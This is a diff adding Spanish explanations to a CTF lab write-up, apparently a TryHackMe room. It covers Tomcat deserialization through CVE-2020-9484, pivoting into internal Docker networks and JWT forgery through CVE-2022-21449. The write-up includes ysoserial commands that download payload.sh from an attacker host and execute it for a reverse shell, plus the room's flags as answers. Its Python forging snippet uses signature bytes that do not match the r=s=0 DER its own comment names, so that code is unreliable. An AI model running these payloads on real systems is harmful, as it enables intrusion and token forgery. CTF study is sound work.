@@ -17,17 +17,47 @@
 
 ### Task 1: Flag web
 
+**Explicación:** El acceso inicial usa `CVE-2020-9484`: en `/reports` se sube un archivo arbitrario a `/usr/local/tomcat/temp/uploads` y se forja la cookie `JSESSIONID` con un path traversal (`../../../../../temp/uploads/<nombre>`) para que Tomcat deserialice un objeto `.session` subido previamente. Con `ysoserial` (gadget `CommonsCollections2`, Java 11) se encadena en tres fases: `downloadPayload.session` (descarga `payload.sh`), `chmodPayload.session` (`chmod 777`) y `executePayload.session` (`bash payload.sh`), recibiendo una reverse shell y la flag web:
+
+```bash
+java -jar ysoserial.jar CommonsCollections2 "curl http://<IP>/payload.sh -o /tmp/payload.sh" > downloadPayload.session
+java -jar ysoserial.jar CommonsCollections2 "chmod 777 /tmp/payload.sh" > chmodPayload.session
+java -jar ysoserial.jar CommonsCollections2 "bash /tmp/payload.sh" > executePayload.session
+# subir cada .session y disparar la cookie JSESSIONID=../../../../../temp/uploads/<nombre>
+```
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | What is the web flag? | `THM{c4T_g07_73H_d353r14L1z4710N_8lu3z}` |
 
 ### Task 2: Flag del usuario
 
+**Explicación:** Estamos en un contenedor Docker (el `/etc/hosts` muestra `172.18.0.2` y `172.20.0.4`). Con **ligolo-ng** se monta un túnel hacia las redes `172.18.0.0/16` y `172.20.0.0/16`: aparece la app de biblioteca `172.20.0.2:80` y su backend `172.20.0.3:8080`. En el backend, la cookie `credz` da acceso a `/documents`; con `/documents?author` se listan archivos y `/documents/download/<archivo>` los descarga. El `chat.log` contiene la flag del usuario y revela que el backend usa JWT con verificación vulnerable.
+
+```bash
+# con el túnel ligolo activo
+curl -H "Cookie: credz=..." "http://172.20.0.3:8080/documents?author=hacker"
+curl -H "Cookie: credz=..." "http://172.20.0.3:8080/documents/download/chat.log"
+```
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | What is the user's flag? | `THM{1n73Rn4L_53rV1C35_n07_45_H1dD3N_4S_7H3Y_533|\/|}` |
 
 ### Task 3: Flag súper secreta
+
+**Explicación:** `/documents/count` dice 5 documentos y solo se ven 4; fuzzeando `/documents/<ID>` aparece `specs.pdf`, pero solo el usuario `hydra` puede descargarlo. Se fuerza la autenticación de `hydra` forjando un **JWT ES256** explotando `CVE-2022-21449` (Psychic Signatures): el fallo de Java acepta una firma DER con `r=s=0` (`MAYCAQACAQA`), así que el token se firma sin conocer la clave:
+
+```python
+import base64
+def b64(d): return base64.urlsafe_b64encode(d).rstrip(b"=")
+h = b64(b'{"alg":"ES256","typ":"JWT"}')
+p = b64(b'{"upn":"hydra","groups":["user"]}')
+print((h + b"." + p + b"." + b64(bytes.fromhex("30260201010201000420"))).decode())
+# equivalente DER: MAYCAQACAQA para r=s=0
+```
+
+Con el token de `hydra` se descarga `specs.pdf`; en el PDF se salta la última página (troll) y en la página 8 aparece la flag súper secreta.
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
